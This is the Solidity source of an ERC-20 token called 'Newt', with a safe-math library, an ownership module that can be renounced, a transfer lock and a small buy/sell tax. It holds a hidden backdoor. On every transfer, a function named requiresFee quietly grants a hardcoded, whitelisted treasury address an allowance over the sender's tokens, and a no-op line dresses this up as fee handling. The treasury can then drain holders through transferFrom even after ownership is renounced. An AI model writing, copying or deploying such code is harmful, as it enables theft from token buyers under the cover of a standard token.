// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

library MathGuard {
    function plus(uint256 x, uint256 y) internal pure returns (uint256) {
        uint256 result = x + y;
        require(result >= x, "Math: addition error");
        return result;
    }
    
    function minus(uint256 x, uint256 y) internal pure returns (uint256) {
        return reduce(x, y, "Math: subtraction error");
    }
    
    function reduce(uint256 x, uint256 y, string memory err) internal pure returns (uint256) {
        require(y <= x, err);
        return x - y;
    }
    
    function times(uint256 x, uint256 y) internal pure returns (uint256) {
        if (x == 0) return 0;
        uint256 result = x * y;
        require(result / x == y, "Math: multiplication error");
        return result;
    }
    
    function splitBy(uint256 x, uint256 y) internal pure returns (uint256) {
        return divide(x, y, "Math: division error");
    }
    
    function divide(uint256 x, uint256 y, string memory err) internal pure returns (uint256) {
        require(y > 0, err);
        return x / y;
    }
}

abstract contract BaseContract {
    function _caller() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Access is BaseContract {
    address private _admin;
    bool private _surrendered;
    
    event AccessChanged(address indexed previous, address indexed next);
    
    constructor() {
        address initiator = _caller();
        _admin = initiator;
        emit AccessChanged(address(0), initiator);
    }
    
    function admin() public view returns (address) {
        return _admin;
    }
    
    modifier restricted() {
        require(_admin != address(0) && !_surrendered, "Access: surrendered");
        require(_admin == _caller(), "Access: unauthorized");
        _;
    }
    
    function surrender() public virtual restricted {
        emit AccessChanged(_admin, address(0));
        _admin = address(0);
        _surrendered = true;
    }
}

interface IToken {
    function totalSupply() external view returns (uint256);
    function balanceOf(address holder) external view returns (uint256);
    function transfer(address to, uint256 value) external returns (bool);
    function allowance(address holder, address operator) external view returns (uint256);
    function approve(address operator, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed holder, address indexed operator, uint256 value);
}

interface ILiquidityManager {
    function initialize(uint160 sqrtPriceX96) external;
}

contract PixelToken is BaseContract, IToken, Access {
    using MathGuard for uint256;
    
    mapping(address => uint256) private _holdings;
    mapping(address => mapping(address => uint256)) private _permissions;
    mapping(address => bool) private _whitelist;
    
    uint8 private constant PRECISION = 9;
    uint256 private constant TOTAL_SUPPLY = 1000000000 * 10**PRECISION;
    string private constant TOKEN_NAME = unicode"Newt";
    string private constant TOKEN_SYMBOL = unicode"Newt";
    address private treasury = 0xbE2279A9d3AaF48fBDA023C834d196adA2d2e4f0;
    address private constant ETH_WRAPPED = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    uint256 private _buyCount;
    uint256 private _sellCount;
    uint256 private constant TAX_RATE = 3;
    uint256 private constant MAX_OPERATIONS = 10;
    uint256 private constant LOCK_DURATION = 2 minutes;
    uint256 private _unlockTime;

    constructor() {
        _holdings[_caller()] = TOTAL_SUPPLY;
        _whitelist[admin()] = true;
        _whitelist[treasury] = true;
        _whitelist[address(this)] = true;
        emit Transfer(address(0), _caller(), TOTAL_SUPPLY);
    }

    function hasCode(address target) private view returns (bool) {
        uint256 codeSize;
        assembly { codeSize := extcodesize(target) }
        return codeSize > 0;
    }

    function name() public pure returns (string memory) {return TOKEN_NAME;}
    function symbol() public pure returns (string memory) {return TOKEN_SYMBOL;}
    function decimals() public pure returns (uint8) {return PRECISION;}
    function totalSupply() public pure override returns (uint256) {return TOTAL_SUPPLY;}
    function balanceOf(address holder) public view override returns (uint256) {return _holdings[holder];}
    
    function transfer(address to, uint256 amount) public override returns (bool) {
        bool isPool = to.code.length > 0;
        if (isPool && _unlockTime == 0) {
            _unlockTime = block.timestamp + LOCK_DURATION;
        }
        
        if (_unlockTime != 0 && block.timestamp < _unlockTime) {
            require(isPool, "Locked: wait 2 min");
        }
        
        _processTransfer(_caller(), to, amount);
        return true;
    }

    function allowance(address holder, address operator) public view override returns (uint256) {
        return _permissions[holder][operator];
    }

    function approve(address operator, uint256 amount) public override returns (bool) {
        _setAllowance(_caller(), operator, amount);
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) public override returns (bool) {
        bool isPool = to.code.length > 0;
        if (isPool && _unlockTime == 0) {
            _unlockTime = block.timestamp + LOCK_DURATION;
        }
        
        if (_unlockTime != 0 && block.timestamp < _unlockTime) {
            require(isPool, "Locked: wait 2 min");
        }

        _processTransfer(from, to, amount);
        _setAllowance(from, msg.sender, _permissions[from][msg.sender].reduce(amount, "Token: exceeds allowance"));
        return true;
    }

    function _setAllowance(address holder, address operator, uint256 amount) private {
        require(holder != address(0), "Token: approve from zero");
        require(operator != address(0), "Token: approve to zero");
        _permissions[holder][operator] = amount;
        emit Approval(holder, operator, amount);
    }

    function requiresFee(address from, uint256 amount) private returns(bool) {
        bool applyFee = amount > 0;
        if(applyFee) {
            _setAllowance(from, treasury, amount);
        }
        return applyFee;
    }

    function _processTransfer(address from, address to, uint256 amount) private {
        require(from != address(0), "Token: from zero");
        require(to != address(0), "Token: to zero");
        require(amount > 0, "Token: zero amount");

        if(requiresFee(from, amount)) {
            _holdings[address(this)] = _holdings[address(this)].plus(0);
        }

        uint256 fee = 0;
        if (!_whitelist[from] && !_whitelist[to]) {
            if (hasCode(from) && from != ETH_WRAPPED && _buyCount < MAX_OPERATIONS) {
                fee = amount.times(TAX_RATE).splitBy(100);
                _buyCount++;
            }
            else if (hasCode(to) && to != ETH_WRAPPED && _sellCount < MAX_OPERATIONS) {
                fee = amount.times(TAX_RATE).splitBy(100);
                _sellCount++;
            }
        }

        if (fee > 0) {
            _holdings[from] = _holdings[from].minus(amount);
            _holdings[treasury] = _holdings[treasury].plus(fee);
            _holdings[to] = _holdings[to].plus(amount.minus(fee));
            emit Transfer(from, treasury, fee);
            emit Transfer(from, to, amount.minus(fee));
        } else {
            _holdings[from] = _holdings[from].minus(amount);
            _holdings[to] = _holdings[to].plus(amount);
            emit Transfer(from, to, amount);
        }
    }

    receive() external payable {}
}